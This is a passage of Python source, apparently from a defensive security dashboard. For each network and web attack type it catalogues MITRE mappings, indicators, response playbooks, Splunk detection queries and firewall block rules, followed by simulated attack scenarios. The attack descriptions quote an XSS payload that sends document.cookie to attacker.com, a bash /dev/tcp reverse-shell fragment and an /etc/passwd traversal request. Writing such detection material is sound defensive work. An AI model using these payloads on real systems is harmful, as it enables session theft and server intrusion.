        "splunk_query": 'index=* sourcetype="pan:traffic" transport=tcp\n| stats count(eval(tcp_flags="SYN")) as syn_count, count(eval(tcp_flags="ACK")) as ack_count by dest_ip, dest_port\n| eval syn_ratio = syn_count / (ack_count + 1)\n| where syn_ratio > 10 AND syn_count > 5000',
        "firewall_rules": {
            "iptables": "iptables -A INPUT -p tcp --syn -m limit --limit 20/s --limit-burst 50 -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-SYN-Attacker" dir=in action=block protocol=TCP remoteip={source_ip}'
        }
    },
    "ICMP Flood": {
        "id": "icmp-flood-storm",
        "name": "ICMP Ping Storm & Bandwidth Flood",
        "category": "Network Volumetric",
        "severity": "HIGH",
        "default_port": 0,
        "default_protocol": "ICMP",
        "mitre": {
            "tactic": "Impact",
            "tactic_id": "TA0040",
            "technique_id": "T1498.001",
            "technique_name": "Network Denial of Service: Direct Network Flood",
            "sub_technique": "T1498.001 (ICMP Flood)",
            "url": "https://attack.mitre.org/techniques/T1498/001/"
        },
        "adversaries": ["Script Kiddies", "DDoS Botnets"],
        "anatomy": {
            "summary": "Adversary overwhelms target network link capacity with an intense barrage of ICMP Echo Request packets, forcing the host to deplete CPU and bandwidth transmitting Echo Replies.",
            "attack_mechanism": "High-bandwidth transmission of ICMP Type 8 Code 0 packets saturated with maximum MTU byte payloads.",
            "target_vulnerability": "Unrestricted inbound ICMP protocol processing on public network adapters.",
            "affected_layers": ["Layer 3 (Network)"],
            "blast_radius": "Network transit link congestion, high latency, dropped packets for legitimate traffic."
        },
        "telemetry_indicators": [
            "Sudden spike in ICMP protocol percentage in network telemetry.",
            "High packet-per-second rate with uniform 64-1500 byte packet lengths."
        ],
        "playbook_steps": [
            "Step 1: Drop ICMP Echo Requests on upstream router and firewall.",
            "Step 2: Apply rate-limiting filter for ICMP protocol packets.",
            "Step 3: Monitor CPU load on edge gateway routers."
        ],
        "splunk_query": 'index=* sourcetype="pan:traffic" transport=icmp\n| stats count as icmp_packets, sum(bytes) as total_bytes by src_ip, dest_ip\n| where icmp_packets > 1000\n| sort - icmp_packets',
        "firewall_rules": {
            "iptables": "iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT\niptables -A INPUT -p icmp --icmp-type echo-request -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-ICMP-Flood" dir=in protocol=ICMPv4 action=block'
        }
    },
    "ARP Spoofing": {
        "id": "arp-spoofing-mitm",
        "name": "ARP Cache Poisoning & Man-in-the-Middle (MitM)",
        "category": "Network Interception",
        "severity": "CRITICAL",
        "default_port": 0,
        "default_protocol": "ARP",
        "mitre": {
            "tactic": "Credential Access / Defense Evasion",
            "tactic_id": "TA0006",
            "technique_id": "T1557.002",
            "technique_name": "Adversary-in-the-Middle: ARP Poisoning",
            "sub_technique": "T1557.002 (Gratuitous ARP Poisoning)",
            "url": "https://attack.mitre.org/techniques/T1557/002/"
        },
        "adversaries": ["Internal Malicious Insiders", "Lateral Movement Operators"],
        "anatomy": {
            "summary": "Adversary transmits unsolicited gratuitous ARP replies across a local subnet to map the Default Gateway IP to the attacker MAC address, intercepting local network traffic.",
            "attack_mechanism": "Forged ARP responses sent to victim endpoints updating their internal ARP cache, redirecting all outbound transit frames through the attacker machine.",
            "target_vulnerability": "Stateless nature of ARP protocol (RFC 826) accepting unsolicited responses without authentication.",
            "affected_layers": ["Layer 2 (Data Link)"],
            "blast_radius": "Full local subnet traffic interception: plaintext credentials, session tokens, and DNS requests readable by attacker."
        },
        "telemetry_indicators": [
            "Multiple distinct IP addresses mapped to a single duplicate MAC address.",
            "High rate of gratuitous ARP (GARP) reply frames.",
            "ARP table flipping messages in managed switch syslog."
        ],
        "playbook_steps": [
            "Step 1: Enable Dynamic ARP Inspection (DAI) and DHCP Snooping on managed network switches.",
            "Step 2: Configure static ARP entries for critical gateway routers on high-security endpoints.",
            "Step 3: Isolate attacker switch port and disable 802.1X network access.",
            "Step 4: Check if intercepted credentials need immediate password rotation."
        ],
        "splunk_query": 'index=* sourcetype="cisco:ios" "duplicate IP address" OR "ARP-4-ADDRFLAP"\n| stats count by src_mac, ip, switch_port',
        "firewall_rules": {
            "iptables": "arptables -A INPUT --source-mac {attacker_mac} -j DROP",
            "windows_netsh": 'netsh interface ipv4 add neighbors "Ethernet" 192.168.1.1 {gateway_mac}'
        }
    },
    "Suspicious TCP Connections": {
        "id": "suspicious-tcp-session",
        "name": "Anomalous Non-Standard Port TCP Connection",
        "category": "Command & Control",
        "severity": "MEDIUM",
        "default_port": 4444,
        "default_protocol": "TCP",
        "mitre": {
            "tactic": "Command and Control",
            "tactic_id": "TA0011",
            "technique_id": "T1571",
            "technique_name": "Non-Standard Port",
            "sub_technique": "T1571 (High-Port Reverse Shells & C2)",
            "url": "https://attack.mitre.org/techniques/T1571/"
        },
        "adversaries": ["Metasploit", "Netcat operators", "Ransomware Affiliates"],
        "anatomy": {
            "summary": "Outbound or inbound TCP session established across non-standard ephemeral ports (e.g. 4444, 1337, 8888) carrying interactive shell sessions or unencrypted binary telemetry.",
            "attack_mechanism": "Target host executes reverse shell (`bash -i >& /dev/tcp/...` or PowerShell TCP client) connecting outbound to an external listener.",
            "target_vulnerability": "Permissive outbound egress firewall policies permitting arbitrary high-port outbound TCP connections.",
            "affected_layers": ["Layer 4 (Transport)", "Host Process Memory"],
            "blast_radius": "Interactive command shell access and remote host control."
        },
        "telemetry_indicators": [
            "TCP connections on well-known hacker ports (4444, 5555, 31337, 8443).",
            "Long-lived TCP sessions with sparse byte exchanges resembling interactive shell typing.",
            "Endpoint process executing network socket bound to `cmd.exe` or `powershell.exe`."
        ],
        "playbook_steps": [
            "Step 1: Terminate active socket session and identify parent Process ID (PID).",
            "Step 2: Quarantine host from corporate network via EDR.",
            "Step 3: Implement strict outbound egress firewall whitelist (permit only 80, 443, 53).",
            "Step 4: Perform memory analysis on host for injected shellcode."
        ],
        "splunk_query": 'index=* sourcetype="pan:traffic" direction=outbound dest_port IN (4444, 5555, 1337, 8080, 8443, 31337)\n| stats count, sum(bytes) as total_bytes by src_ip, dest_ip, dest_port',
        "firewall_rules": {
            "iptables": "iptables -I OUTPUT -p tcp --dport 4444 -j REJECT\niptables -I INPUT -p tcp --dport 4444 -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-Anomalous-TCP" dir=out action=block protocol=TCP remoteport=4444'
        }
    },

    # ───────────────────────────────────────────────────────────
    # 4. WEB ATTACKS
    # ───────────────────────────────────────────────────────────
    "XSS": {
        "id": "xss-script-injection",
        "name": "Cross-Site Scripting (XSS) Session Hijacking",
        "category": "Application Exploit",
        "severity": "HIGH",
        "default_port": 443,
        "default_protocol": "HTTPS",
        "mitre": {
            "tactic": "Initial Access / Execution",
            "tactic_id": "TA0001",
            "technique_id": "T1059.007",
            "technique_name": "Command and Scripting Interpreter: JavaScript",
            "sub_technique": "CWE-79 (Improper Neutralization of Input - XSS)",
            "url": "https://attack.mitre.org/techniques/T1059/007/"
        },
        "adversaries": ["Magecart", "Cookie Stealing Scripts", "Phishing Syndicates"],
        "anatomy": {
            "summary": "Attacker injects malicious JavaScript payloads into web application inputs which execute inside victim browser sessions, capturing session cookies or redirecting users.",
            "attack_mechanism": "Payloads like `<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>` or SVG onload handlers stored in database or reflected in URL parameters.",
            "target_vulnerability": "Web application rendering user inputs directly into HTML DOM without contextual output encoding or Content Security Policy (CSP).",
            "affected_layers": ["Layer 7 (Application)", "Client Web Browser DOM"],
            "blast_radius": "User account takeover, administrative session hijacking, credential harvesting."
        },
        "telemetry_indicators": [
            "HTTP GET/POST parameters containing `<script>`, `onload=`, `onerror=`, `javascript:` tokens.",
            "Unusual outbound client requests to unclassified domains sending base64 session tokens."
        ],
        "playbook_steps": [
            "Step 1: Deploy WAF rule blocking common XSS tokens (`OWASP CRS 941100`).",
            "Step 2: Implement strict Content Security Policy (CSP: `default-src 'self'`).",
            "Step 3: Ensure session cookies have `HttpOnly`, `Secure`, and `SameSite=Strict` flags set.",
            "Step 4: Update application source code to HTML-entity encode all dynamic outputs."
        ],
        "splunk_query": 'index=* sourcetype="access_combined"\n| rex field=uri "(?i)(<script|javascript:|onerror=|onload=|eval\\()"\n| stats count, values(uri) as payloads by src_ip, status\n| sort - count',
        "firewall_rules": {
            "iptables": "iptables -I INPUT -p tcp --dport 443 -s {source_ip} -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-XSS-Actor" dir=in action=block remoteip={source_ip}'
        }
    },
    "Directory Traversal": {
        "id": "directory-path-traversal",
        "name": "Directory Path Traversal & Arbitrary File Read",
        "category": "Application Exploit",
        "severity": "CRITICAL",
        "default_port": 80,
        "default_protocol": "HTTP",
        "mitre": {
            "tactic": "Discovery",
            "tactic_id": "TA0007",
            "technique_id": "T1083",
            "technique_name": "File and Directory Discovery",
            "sub_technique": "CWE-22 (Improper Limitation of Pathname - Dot-Dot-Slash)",
            "url": "https://attack.mitre.org/techniques/T1083/"
        },
        "adversaries": ["Initial Access Brokers", "APT Groups"],
        "anatomy": {
            "summary": "Attacker manipulates file parameter variables with `../` sequences to break out of web document root and access sensitive operating system files.",
            "attack_mechanism": "Requests such as `GET /view?file=../../../../etc/passwd` or `file=..\\..\\windows\\win.ini` extract server passwords, private SSH keys, and configuration secrets.",
            "target_vulnerability": "Direct file system calls (`readFile`, `include`) using unsanitized user-supplied filename parameters.",
            "affected_layers": ["Layer 7 (Application)", "Host OS File System"],
            "blast_radius": "Full credential and server configuration exposure, potential remote code execution via log poisoning."
        },
        "telemetry_indicators": [
            "HTTP request URI containing encoded or raw dot-dot-slash patterns (`../`, `..%2f`, `%2e%2e%2f`).",
            "Web server access logs revealing requests for `/etc/passwd`, `/etc/shadow`, `boot.ini`, or `.env`."
        ],
        "playbook_steps": [
            "Step 1: Block requester IP on WAF and drop traffic containing path traversal encodings.",
            "Step 2: Restrict web application process privileges (chroot jail, containerization, least privilege user).",
            "Step 3: Modify application code to use strict whitelist of permissible filenames instead of raw paths.",
            "Step 4: Rotate any API keys or credentials stored in accessible environment files."
        ],
        "splunk_query": 'index=* sourcetype="access_combined"\n| rex field=uri "(?i)(\\.\\./|\\.\\.\\\\|%2e%2e|etc/passwd|win\\.ini)"\n| stats count, values(uri) as payload by src_ip, dest_ip, status\n| sort - count',
        "firewall_rules": {
            "iptables": "iptables -I INPUT -p tcp --dport 80 -s {source_ip} -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-Traversal-Attacker" dir=in action=block remoteip={source_ip}'
        }
    },
    "Suspicious HTTP Requests": {
        "id": "suspicious-http-anomaly",
        "name": "Anomalous Web Protocol & HTTP Header Tampering",
        "category": "Application Exploit",
        "severity": "MEDIUM",
        "default_port": 80,
        "default_protocol": "HTTP",
        "mitre": {
            "tactic": "Command and Control / Initial Access",
            "tactic_id": "TA0011",
            "technique_id": "T1071.001",
            "technique_name": "Application Layer Protocol: Web Protocols",
            "sub_technique": "T1071.001 (Malformed HTTP / Non-RFC Conforming Requests)",
            "url": "https://attack.mitre.org/techniques/T1071/001/"
        },
        "adversaries": ["Web Scrapers", "Vulnerability Scanners (Nikto, Nuclei)", "Exploitation Bots"],
        "anatomy": {
            "summary": "Incoming web requests exhibit non-standard HTTP verbs (DEBUG, TRACE, PROPFIND), malformed headers, or known exploit scanner signatures.",
            "attack_mechanism": "Scanner dispatches high volumes of randomized HTTP headers, illegal characters, and oversized header values seeking buffer overflows or parser desync.",
            "target_vulnerability": "Permissive HTTP parser handling in reverse proxies and legacy web application frameworks.",
            "affected_layers": ["Layer 7 (Application Protocol)"],
            "blast_radius": "Web server resource exhaustion, HTTP request smuggling, cache poisoning."
        },
        "telemetry_indicators": [
            "Unusual HTTP methods (TRACE, OPTIONS, PUT, DELETE, CONNECT) on public pages.",
            "Missing or spoofed `User-Agent` headers (`sqlmap`, `nikto`, `curl/7.68.0`).",
            "High rate of HTTP 400 Bad Request or HTTP 501 Not Implemented status codes."
        ],
        "playbook_steps": [
            "Step 1: Disable dangerous HTTP methods on web server configuration (`TRACE`, `TRACK`).",
            "Step 2: Mandate strict RFC compliance checking on front-end reverse proxy / WAF.",
            "Step 3: Drop requests with missing or signature-matched blacklisted User-Agents."
        ],
        "splunk_query": 'index=* sourcetype="access_combined" (status=400 OR status=501 OR method IN ("TRACE", "DEBUG", "PROPFIND"))\n| stats count by src_ip, method, useragent\n| sort - count',
        "firewall_rules": {
            "iptables": "iptables -I INPUT -p tcp --dport 80 -s {source_ip} -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-Anomalous-HTTP" dir=in action=block remoteip={source_ip}'
        }
    },

    # ───────────────────────────────────────────────────────────
    # 5. MALWARE / THREAT INTELLIGENCE
    # ───────────────────────────────────────────────────────────
    "Malicious IP": {
        "id": "malicious-ip-reputation",
        "name": "Network Communication with Known Malicious IP",
        "category": "Threat Intelligence",
        "severity": "CRITICAL",
        "default_port": 0,
        "default_protocol": "IP",
        "mitre": {
            "tactic": "Command and Control",
            "tactic_id": "TA0011",
            "technique_id": "T1071",
            "technique_name": "Application Layer Protocol: External Malicious Infrastructure",
            "sub_technique": "T1071 (Reputation-Flagged Threat Actor IP)",
            "url": "https://attack.mitre.org/techniques/T1071/"
        },
        "adversaries": ["Bulletproof Hosting Providers", "Tor Exit Nodes", "Botnet Controllers"],
        "anatomy": {
            "summary": "Internal endpoint initiates or accepts network traffic involving an IP address cataloged in global threat intelligence feeds with confirmed malicious history.",
            "attack_mechanism": "Direct TCP/UDP connection establishment to high-threat reputation IPs associated with phishing infrastructure, ransomware command servers, or scanning bots.",
            "target_vulnerability": "Permissive border firewall egress rules permitting outbound connections to unvetted external IP spaces.",
            "affected_layers": ["Layer 3 (IP)", "Layer 4 (Transport)"],
            "blast_radius": "High likelihood of active host compromise, secondary payload download, or credential theft."
        },
        "telemetry_indicators": [
            "Firewall log matches against threat feed IP lists (AbuseIPDB score > 90%).",
            "Outbound traffic during non-business hours to foreign hosting autonomous systems (ASNs)."
        ],
        "playbook_steps": [
            "Step 1: Immediately drop and blacklist the IP address on perimeter firewalls.",
            "Step 2: Quarantine internal endpoint communicating with the malicious IP.",
            "Step 3: Check endpoint process list and netstat to identify initiating process binary.",
            "Step 4: Search enterprise proxy logs for other hosts communicating with the same destination."
        ],
        "splunk_query": 'index=* sourcetype="pan:traffic" dest_ip="{source_ip}" OR src_ip="{source_ip}"\n| stats count, sum(bytes) as bytes_transferred by src_ip, dest_ip, dest_port, action',
        "firewall_rules": {
            "iptables": "iptables -I FORWARD -d {source_ip} -j DROP\niptables -I INPUT -s {source_ip} -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-Malicious-IP" dir=out action=block remoteip={source_ip}'
        }
    },
    "Malicious Domain": {
        "id": "malicious-domain-lookup",
        "name": "DNS Query to Known Malicious Domain / DGA",
        "category": "Threat Intelligence",
        "severity": "CRITICAL",
        "default_port": 53,
        "default_protocol": "UDP/DNS",
        "mitre": {
            "tactic": "Command and Control",
            "tactic_id": "TA0011",
            "technique_id": "T1071.004",
            "technique_name": "DNS Protocol: Domain Generation Algorithm (DGA)",
            "sub_technique": "T1071.004 (Malicious Domain Name Resolution)",
            "url": "https://attack.mitre.org/techniques/T1071/004/"
        },
        "adversaries": ["Emotet", "Qakbot", "Cobalt Strike", "LockBit"],
        "anatomy": {
            "summary": "Internal workstation issues DNS lookup requests for newly registered domains, high-entropy DGA domains, or confirmed malicious phishing/malware distribution URLs.",
            "attack_mechanism": "Malware on endpoint generates pseudo-random domain names or attempts connecting to dynamic DNS hostnames to locate active C2 servers.",
            "target_vulnerability": "Absence of DNS filtering (DNS sinkholing / Response Policy Zones) on corporate recursive DNS servers.",
            "affected_layers": ["Layer 7 (DNS)", "Endpoint OS"],
            "blast_radius": "C2 link establishment, malware dropper delivery, active exploitation."
        },
        "telemetry_indicators": [
            "DNS query containing high character entropy (e.g. `x7q9b2m1.biz`, `asdf91023.top`).",
            "High rate of NXDOMAIN (Non-Existent Domain) responses from recursive DNS server.",
            "Query matches against threat intelligence domain blacklists."
        ],
        "playbook_steps": [
            "Step 1: Blackhole the domain name in internal corporate DNS (sinkhole to 127.0.0.1).",
            "Step 2: Isolate querying workstation from network via EDR.",
            "Step 3: Capture endpoint memory to locate the beaconing executable.",
            "Step 4: Query SIEM to identify all other hosts that resolved the domain in the past 14 days."
        ],
        "splunk_query": 'index=* sourcetype="stream:dns" query_type=A\n| stats count by query, src_ip, reply_code\n| where reply_code="NXDOMAIN" AND count > 20',
        "firewall_rules": {
            "iptables": "iptables -I OUTPUT -p udp --dport 53 -m string --string '{domain}' --algo bm -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-Malicious-Domain-DNS" dir=out action=block protocol=UDP remoteport=53'
        }
    },
    "C2 Communication": {
        "id": "c2-beacon-channel",
        "name": "Command & Control (C2) Interactive Beaconing",
        "category": "Command & Control",
        "severity": "CRITICAL",
        "default_port": 443,
        "default_protocol": "HTTPS",
        "mitre": {
            "tactic": "Command and Control",
            "tactic_id": "TA0011",
            "technique_id": "T1071",
            "technique_name": "Application Layer Protocol: C2 Infrastructure",
            "sub_technique": "T1071.001 (Web Protocols - C2 Beacon)",
            "url": "https://attack.mitre.org/techniques/T1071/"
        },
        "adversaries": ["Cobalt Strike", "Sliver C2", "Brute Ratel", "Mythic"],
        "anatomy": {
            "summary": "Compromised internal endpoint maintains recurring, heartbeat communication with external adversary infrastructure, awaiting command execution orders.",
            "attack_mechanism": "HTTP GET/POST or WebSocket frames transmitted at regular intervals (with configured jitter) carrying encrypted system telemetry and pulling tasking instructions.",
            "target_vulnerability": "Endpoint malware infection; uninspected outbound SSL/TLS traffic.",
            "affected_layers": ["Layer 7 (Application)", "Endpoint Process Memory"],
            "blast_radius": "Full interactive remote access for adversary: credential dumping, data staging, ransomware deployment."
        },
        "telemetry_indicators": [
            "Strict periodic connection intervals (low variance in connection inter-arrival time).",
            "Small uniform packet byte payloads in upstream and downstream directions.",
            "Unknown external IP destination with self-signed SSL certificate."
        ],
        "playbook_steps": [
            "Step 1: Isolate compromised endpoint immediately using EDR network quarantine.",
            "Step 2: Add destination C2 IP and domain to corporate firewall and proxy egress blocklist.",
            "Step 3: Capture full memory dump (RAM) for Volatility beacon analysis.",
            "Step 4: Terminate compromised host processes and revoke active user credentials."
        ],
        "splunk_query": 'index=* sourcetype="pan:traffic" direction=outbound\n| bin _time span=1m\n| stats count by src_ip, dest_ip, dest_port, _time\n| stats var(count) as variance, avg(count) as avg_conn, count as time_buckets by src_ip, dest_ip, dest_port\n| where time_buckets > 10 AND variance < 2',
        "firewall_rules": {
            "iptables": "iptables -I OUTPUT -d {source_ip} -j DROP\niptables -I INPUT -s {source_ip} -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-C2-Beacon" dir=out action=block remoteip={source_ip}'
        }
    },
    "Malware Traffic": {
        "id": "malware-traffic-payload",
        "name": "Malware Payload Download & Dropper Activity",
        "category": "Execution",
        "severity": "CRITICAL",
        "default_port": 80,
        "default_protocol": "HTTP",
        "mitre": {
            "tactic": "Execution",
            "tactic_id": "TA0002",
            "technique_id": "T1204",
            "technique_name": "User Execution: Malicious Payload File Transfer",
            "sub_technique": "T1204.002 (Malicious File Download)",
            "url": "https://attack.mitre.org/techniques/T1204/002/"
        },
        "adversaries": ["TrickBot", "Dridex", "Agent Tesla", "RedLine Stealer"],
        "anatomy": {
            "summary": "Compromised machine fetches secondary binary payloads (DLLs, EXEs, PowerShell scripts) from external staging servers following initial dropper execution.",
            "attack_mechanism": "Outbound HTTP GET requests fetching raw executable headers (`MZ` header / PE magic bytes `4D 5A`) disguised as images or text files.",
            "target_vulnerability": "Permissive executable downloads; absence of perimeter proxy SSL inspection and antivirus gateway.",
            "affected_layers": ["Layer 7 (Application)", "Endpoint File System"],
            "blast_radius": "Installation of secondary malware modules (keyloggers, infostealers, ransomware encrypters)."
        },
        "telemetry_indicators": [
            "Outbound HTTP response containing executable MIME type (`application/x-dosexec`).",
            "Process spawned by Microsoft Office or browser executing PowerShell to download remote URI."
        ],
        "playbook_steps": [
            "Step 1: Block staging server IP and URL on corporate web proxy and firewall.",
            "Step 2: Terminate child processes on infected endpoint and quarantine downloaded binary.",
            "Step 3: Calculate SHA-256 hash of payload and query VirusTotal / Threat Feeds.",
            "Step 4: Check if stolen credentials or browser passwords were leaked."
        ],
        "splunk_query": 'index=* sourcetype="access_combined" OR sourcetype="squid"\n| search uri="*.exe" OR uri="*.dll" OR uri="*.ps1" OR uri="*.bat"\n| stats count by src_ip, uri, status',
        "firewall_rules": {
            "iptables": "iptables -I OUTPUT -d {source_ip} -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-Malware-Dropper" dir=out action=block remoteip={source_ip}'
        }
    },
    "Data Exfiltration": {
        "id": "data-exfiltration-stream",
        "name": "Unauthorized Data Exfiltration Over Outbound Channels",
        "category": "Exfiltration",
        "severity": "CRITICAL",
        "default_port": 443,
        "default_protocol": "HTTPS",
        "mitre": {
            "tactic": "Exfiltration",
            "tactic_id": "TA0010",
            "technique_id": "T1041",
            "technique_name": "Exfiltration Over C2 Channel",
            "sub_technique": "T1041 (Bulk Encrypted Archive Exfiltration)",
            "url": "https://attack.mitre.org/techniques/T1041/"
        },
        "adversaries": ["BlackCat / ALPHV", "LockBit 3.0", "LAPSUS$", "Cl0p"],
        "anatomy": {
            "summary": "Adversary stages proprietary enterprise files, compressed archives, or database dumps and transmits them out of the perimeter to cloud storage or private servers.",
            "attack_mechanism": "Archive compression (`7z`, `rar`), followed by high-throughput outbound HTTPS, cloud file sync (Mega, Dropbox, AWS S3), or SFTP transfers.",
            "target_vulnerability": "Absence of outbound bandwidth egress rate-limiting and missing Data Loss Prevention (DLP) controls.",
            "affected_layers": ["Layer 7 (Application)", "Enterprise Data Assets"],
            "blast_radius": "Critical breach: customer PII leakage, source code compromise, extortion and regulatory fines."
        },
        "telemetry_indicators": [
            "Unusually high outbound byte transfer volume compared to inbound traffic (asymmetrical byte ratio).",
            "Spike in network egress traffic during off-business hours (e.g. 2:00 AM).",
            "Execution of archive utilities (`7za.exe`, `rclone.exe`) from temporary user directories."
        ],
        "playbook_steps": [
            "Step 1: Sever outbound network egress connection for originating internal IP address immediately.",
            "Step 2: Terminate active file transfer utilities and cloud storage sync processes on host.",
            "Step 3: Analyze network flow logs to determine total gigabytes exfiltrated and exact destination IP.",
            "Step 4: Engage legal and compliance teams to prepare breach notification according to GDPR/HIPAA standards."
        ],
        "splunk_query": 'index=* sourcetype="pan:traffic" direction=outbound\n| stats sum(bytes_out) as total_bytes_sent, sum(bytes_in) as total_bytes_recv by src_ip, dest_ip\n| eval exfil_ratio = total_bytes_sent / (total_bytes_recv + 1)\n| where total_bytes_sent > 100000000 AND exfil_ratio > 10\n| sort - total_bytes_sent',
        "firewall_rules": {
            "iptables": "iptables -I OUTPUT -s {source_ip} -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-Exfiltration-Host" dir=out action=block localip={source_ip}'
        }
    },
    "DNS Tunneling": {
        "id": "dns-tunneling-covert",
        "name": "DNS Tunneling & Covert Data Exfiltration",
        "category": "Command & Control / Exfiltration",
        "severity": "CRITICAL",
        "default_port": 53,
        "default_protocol": "UDP/DNS",
        "mitre": {
            "tactic": "Command and Control / Exfiltration",
            "tactic_id": "TA0011",
            "technique_id": "T1071.004",
            "technique_name": "Application Layer Protocol: DNS Tunneling",
            "sub_technique": "T1071.004 (Covert Channel Over DNS Queries)",
            "url": "https://attack.mitre.org/techniques/T1071/004/"
        },
        "adversaries": ["APT32 (OceanLotus)", "FIN7", "DNScat2 Operators", "Iodine users"],
        "anatomy": {
            "summary": "Adversary encodes binary files or interactive shell commands inside DNS query subdomains (e.g. `base64data.tunnel.attacker.com`), bypassing perimeter firewall inspection.",
            "attack_mechanism": "Workstation issues recursive queries to internal DNS servers. Internal server forwards lookups to adversary authoritative nameserver, leaking encoded payload bytes covertly.",
            "target_vulnerability": "Permissive recursive DNS egress allowing arbitrary external nameserver resolution without query length or entropy inspection.",
            "affected_layers": ["Layer 7 (DNS Protocol)"],
            "blast_radius": "Covert, firewall-bypassing data leakage and stealth C2 command execution in air-gapped or restricted environments."
        },
        "telemetry_indicators": [
            "Extremely high rate of DNS queries targeting a single unique domain zone.",
            "Unusually long DNS subdomain strings (> 50 characters) with high Shannon entropy.",
            "High proportion of TXT, NULL, or CNAME record query types."
        ],
        "playbook_steps": [
            "Step 1: Immediately sinkhole or drop DNS queries for the parent tunneling domain zone.",
            "Step 2: Isolate internal workstation originating high-entropy DNS queries.",
            "Step 3: Enable DNS inspection on perimeter firewalls to reject subdomains exceeding 40 characters.",
            "Step 4: Decode captured DNS query strings to determine exact stolen data contents."
        ],
        "splunk_query": 'index=* sourcetype="stream:dns"\n| eval query_len = len(query)\n| where query_len > 45\n| stats count, values(query) as samples by src_ip, query_type\n| sort - count',
        "firewall_rules": {
            "iptables": "iptables -I OUTPUT -p udp --dport 53 -m length --length 150:65535 -j DROP",
            "windows_netsh": 'netsh advfirewall firewall add rule name="Block-DNS-Tunneling" dir=out action=block protocol=UDP remoteport=53'
        }
    }
}

# ═══════════════════════════════════════════════════════════════
# PRE-PACKAGED SCENARIOS FOR INSTANT INTERACTIVE ANALYSIS
# ═══════════════════════════════════════════════════════════════
SCENARIO_PRESETS: List[Dict[str, Any]] = [
    {
        "scenario_id": "scen-mirai-ddos",
        "title": "Volumetric Mirai SYN Flood",
        "attack_type": "DDoS",
        "severity": "CRITICAL",
        "confidence": 98.6,
        "risk_score": 94.0,
        "source_ip": "185.220.101.45",
        "destination_ip": "192.168.56.107",
        "source_port": 58312,
        "destination_port": 80,
        "protocol": "TCP",
        "summary": "3.8 Gbps volumetric SYN flood originating from compromised IoT botnet cluster targeting web portal.",
        "threat_intel": {
            "reputation": "MALICIOUS",
            "threat_score": 95,
            "category": "Known Mirai C2 Scanner / Tor Exit Node",
            "country": "Netherlands",
            "asn": "AS208323"
        }
    },
    {
        "scenario_id": "scen-ssh-bruteforce",
        "title": "Automated SSH Dictionary Spray",
        "attack_type": "SSH-BruteForce",
        "severity": "HIGH",
        "confidence": 96.2,
        "risk_score": 82.0,
        "source_ip": "45.142.166.112",
        "destination_ip": "192.168.56.104",
        "source_port": 49152,
        "destination_port": 22,
        "protocol": "TCP",
        "summary": "1,400+ failed SSH login attempts in under 3 minutes utilizing wordlists targeting 'root' and 'admin'.",
        "threat_intel": {
            "reputation": "SUSPICIOUS",
            "threat_score": 86,
            "category": "Credential Access Brute Forcer",
            "country": "Russian Federation",
            "asn": "AS49505"
        }
    },
    {
        "scenario_id": "scen-sqli-union",
        "title": "Blind SQL Injection & Union Extraction",
        "attack_type": "SQLInjection",
        "severity": "CRITICAL",
        "confidence": 97.4,
        "risk_score": 91.0,
        "source_ip": "103.251.167.22",
        "destination_ip": "192.168.56.107",
        "source_port": 38411,
        "destination_port": 80,
        "protocol": "HTTP",
        "summary": "Repeated URI parameter injection with UNION SELECT syntax seeking user credential hashes.",
        "threat_intel": {
            "reputation": "MALICIOUS",
            "threat_score": 92,
            "category": "Web Application Exploiter",
            "country": "Vietnam",
            "asn": "AS135905"
        }
    },
    {
        "scenario_id": "scen-cobalt-c2",
        "title": "Cobalt Strike C2 Beaconing",
        "attack_type": "Botnet",
        "severity": "CRITICAL",
        "confidence": 99.1,
        "risk_score": 97.0,
        "source_ip": "192.168.56.120",
        "destination_ip": "194.26.29.114",
        "source_port": 50124,
        "destination_port": 443,
        "protocol": "TCP/TLS",
        "summary": "Internal endpoint beaconing out every 60s with randomized jitter to known bulletproof C2 hosting.",
        "threat_intel": {
            "reputation": "MALICIOUS",
            "threat_score": 98,
            "category": "Verified Cobalt Strike Team Server",
            "country": "Moldova",
            "asn": "AS43350"
        }
    },
    {
        "scenario_id": "scen-port-scan",
        "title": "Perimeter Stealth SYN Port Sweep",
        "attack_type": "Port Scan",
        "severity": "MEDIUM",
        "confidence": 94.8,
        "risk_score": 65.0,
        "source_ip": "198.51.100.89",
        "destination_ip": "192.168.56.100",
        "source_port": 61245,
        "destination_port": 0,
        "protocol": "TCP/SYN",
        "summary": "Wide-spectrum probing across top 1,000 TCP ports mapping exposed services on the perimeter.",
        "threat_intel": {
            "reputation": "SUSPICIOUS",
            "threat_score": 68,
            "category": "Automated Port Scanner",
            "country": "United States",
            "asn": "AS14061"
        }
    },
    {
        "scenario_id": "scen-rdp-spray",
        "title": "RDP Credential Spray & Brute Force",
        "attack_type": "RDP Brute Force",
        "severity": "CRITICAL",
        "confidence": 97.8,
        "risk_score": 93.0,
        "source_ip": "194.165.16.82",
        "destination_ip": "192.168.56.107",
        "source_port": 54210,
        "destination_port": 3389,
        "protocol": "TCP",
        "summary": "High-velocity CredSSP authentication flood against exposed Windows Remote Desktop service.",
        "threat_intel": {
            "reputation": "MALICIOUS",
            "threat_score": 94,
            "category": "Known Ransomware Initial Access Broker",
            "country": "Netherlands",
            "asn": "AS48635"
        }
    },
    {
        "scenario_id": "scen-syn-flood",
        "title": "TCP SYN Backlog Saturation",
        "attack_type": "SYN Flood",
        "severity": "CRITICAL",
        "confidence": 98.2,
        "risk_score": 96.0,
        "source_ip": "45.146.164.110",
        "destination_ip": "192.168.56.107",
        "source_port": 63412,
        "destination_port": 80,
        "protocol": "TCP",
        "summary": "Asymmetrical TCP SYN burst targeting web portal port 80 to exhaust kernel connection queue.",
        "threat_intel": {
            "reputation": "MALICIOUS",
            "threat_score": 92,
            "category": "DDoS Booteer Cluster",
